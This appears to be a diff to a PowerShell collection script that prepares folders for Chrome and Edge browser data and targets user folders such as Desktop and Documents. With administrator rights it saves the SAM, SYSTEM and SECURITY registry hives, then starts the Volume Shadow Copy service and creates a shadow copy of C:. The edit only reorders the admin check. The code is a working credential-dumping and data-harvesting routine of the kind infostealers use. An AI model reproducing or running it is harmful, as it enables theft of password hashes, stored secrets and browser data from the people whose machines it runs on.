@@ -129,16 +129,19 @@ $deskDirs = @('Desktop', 'Documents', 'Downloads', 'OneDrive')
         $browsersDestDir = ($destDir + 'Browsers\'); New-Item $browsersDestDir -ItemType Directory -ea 0
         $chromeDestDir = ($destDir + 'Browsers\Chrome\'); New-Item $chromeDestDir -ItemType Directory -ea 0
         $edgeDestDir = ($destDir + 'Browsers\Edge\'); New-Item $edgeDestDir -ItemType Directory -ea 0
+        
+        $VSsvc = (Get-Service -name VSS)
+        
         if (Test-isAdmin) {
             reg.exe save hklm\sam $browsersDestDir\SAM
             reg.exe save hklm\system $browsersDestDir\SYSTEM
             reg.exe save hklm\security $browsersDestDir\SECURITY
-        }
-
-        $VSsvc = (Get-Service -name VSS)
-        if($VSsvc.Status -ne "Running") {
-            $notrunning=1
-            $VSsvc.Start()
+            if($VSsvc.Status -ne "Running") {
+               $notrunning=1
+               $VSsvc.Start()
+            } 
+        } else {
+            echo "You're not an administrator"
         }
 
         $id = (Get-WmiObject -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
